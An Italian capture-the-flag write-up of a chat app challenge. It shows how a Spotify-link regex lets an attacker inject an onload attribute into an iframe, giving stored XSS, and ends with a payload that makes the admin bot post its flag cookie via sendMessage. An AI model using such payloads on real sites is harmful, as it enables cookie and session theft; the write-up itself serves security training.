- La challenge si presenta come una chat tra persono in cui la caratteristica principale è che possiamo inviare anche dei link di traccie spotify che tramite API vengono embeddate nella pagina con un player (tramite un tag iframe)
- La prima cosa che noto è che c'è un tasto notify vicino alla chat con l'admin il che mi ha subito fatto pensare ad una XSS
	- Controllando nel codice il tasto notify fa eseguire delle operazioni scriptate all'admin (è un bot). Le azioni sono le seguenti
```python
'actions': [
	
	{
	
		'type': 'request',
		
		'method': 'POST',
		
		'url': f'http://{WEB_DOM}/api/v1/session',
	
	'headers': {
	
		'Content-Type': 'application/json'
	
	},
	
		'data': f'{{"username":"admin","password":"{ADMIN_PASSWORD}"}}'
	
	},
	
	{
	
	'type': 'request',
	
	'url': f'http://{WEB_DOM}/chat/{session["user"]}',
	
	'timeout': 5
	
	},
	
	{
	
		'type': 'set-cookie',
		
		'name': 'flag',
		
		'value': os.getenv('FLAG', 'CCIT{REDACTED}'),
		
	},
	
	{
	
		'type': 'click',
		
		'element': '#loadChat'
	
	},
	
	{
	
		'type': 'sleep',
		
		'time': 5
	
	}

]
```
- Interessante prima carica la sessione, successivamente setta il cookie con la flag e infine carica la chat 
	- Da qui ho la conferma dell'XSS
- Come posso fare inj di codice javascript? Per prima cosa vado a vedere come viene renderizzato l'html di un semplice messaggio
	- Quello che noto è che il messaggio viene inserito in un normalissimo div
	- Provando a chiudere prematuramente il tag con un qualcosa del tipo `><script>...` notiamo che lo script viene parsato correttamente
		- Come fa il parsing dei messaggi? Osserviamo il codice
```js

function escapeHtml(html) {

	const text = document.createTextNode(html);
	
	const p = document.createElement('p');
	
	p.appendChild(text);
	
	return p.innerHTML;

}

function markdownify(input) {
	
	// Sanitize input
	
	input = escapeHtml(input);
	
	// Links
	
	input = input.replace(/\(([^\(\)\s]+)\)\[([^\[\]]+)\]/g, (match, url, text) => {
	
	if (url.startsWith('https://open.spotify.com/track/')) {
	
	return `</div><iframe sandbox="allow-scripts allow-same-origin" width="100%" height="80" frameBorder="0" allow="encrypted-media" src="${url.replace(
	
	'https://open.spotify.com/track/',
	
	'https://open.spotify.com/embed/track/'
	
	)}"></iframe><div class="message">`;
	
	}
	
	return `<a target="_blank" href="${url}">${text}</a>`;
	
	});
	
	
	// Bold text
	
	input = input.replace(/(^|\W)\*\*([A-Za-z0-9\s]+)\*\*($|\W)/g, '$1<strong>$2</strong>$3');
	
	  
	// Italic text
	
	input = input.replace(/(^|\W)_([A-Za-z0-9\s]+)_($|\W)/g, '$1<em>$2</em>$3');
  
	
	// New line
	
	input = input.replace(/\n/g, '<br />');
		
	return input;

}
```
- Quello che notiamo è che indipendentemente dal codice viene mandato in pasto alla funzione createTextNode inibisce ogni tentativo di interpretazione del nostro codice come html
- Non demordiamo e vediamo che per fare il loading del player l'url della canzone viene inserito nel tag iframe nel parametro src
	- Quello che dobbiamo fare in questo caso è inserire un url che matchi con la regex e che riesca ad aggiungere del codice aggiuntivo a quel tag
```js
'<iframe src="${url}">'
```
- Abbreviato il contesto è quello sopra, quindi se io riesco a inserire un url come "onload="alert`1`"
	- SBAMM abbiamo una stored XSS
-  Ora c'è da capire ottenere il cookie
	- Il primo tentativo che ho provato è stato con una fetch ad un mio web server che però ha miseramente fallito. La richiesta veniva bloccata causa content security policy
	- L'altra soluzione è che sia l'admin ad inviarmi il messaggio con il cookie
		- Per farlo controllo il codice e quello che noto è per l'invio di messaggi mi basta invocare una funzione js sendMessage 
		- Lo script a questo punto è presto fatto "onload="sendMessage'${document.cookie}'"
>flag=CCIT{n3v3r_g0Nn4_m4rK_y0U_D0wn}
> sostituire i singoli apici con i backtick



